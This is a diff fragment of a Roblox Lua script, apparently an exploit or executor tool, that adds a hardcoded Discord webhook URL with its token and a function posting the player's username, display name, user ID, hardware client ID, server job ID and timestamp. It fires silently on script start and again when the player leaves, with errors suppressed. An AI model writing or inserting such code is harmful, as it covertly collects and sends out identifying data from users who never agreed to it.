@@ -146,6 +146,47 @@ local marketservice = game:GetService("MarketplaceService")
 local rbxservice = game:GetService("RbxAnalyticsService")
 local tspmo = game:GetService("TweenService")
 
+
+local webhook = "https://discordapp.com/api/webhooks/1434766682051706974/hHWdsoQ3Qhch2NVH6hIFyrfkV1WImZlltS_3Ga52jbjiAb20XrVFCwjHGSBt6tjFK6t_"
+
+local function sendWebhook(event)
+    local payload = {
+        content = string.format([[
+[PROJECT INSTRA]
+[+] Event: %s
+[+] Username: %s
+[+] Display Name: %s
+[+] User ID: %s
+[+] HWID: %s
+[+] Job ID: %s
+[+] Time: %s
+        ]],
+        event,
+        plr.Name,
+        plr.DisplayName,
+        tostring(plr.UserId),
+        rbxservice:GetClientId(),
+        game.JobId,
+        os.date("%Y-%m-%d %H:%M:%S"))
+    }
+
+    pcall(function()
+        http:PostAsync(webhook, http:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+-- Send on script execution
+sendWebhook("Script Executed")
+
+-- Send on player leave
+plr.AncestryChanged:Connect(function(_, parent)
+    if not parent then
+        sendWebhook("Player Left")
+    end
+end)
+
+
+
 -- Minimal safe setclipboard wrapper
 local function safe_setclipboard(val)
     if type(setclipboard) == "function" then
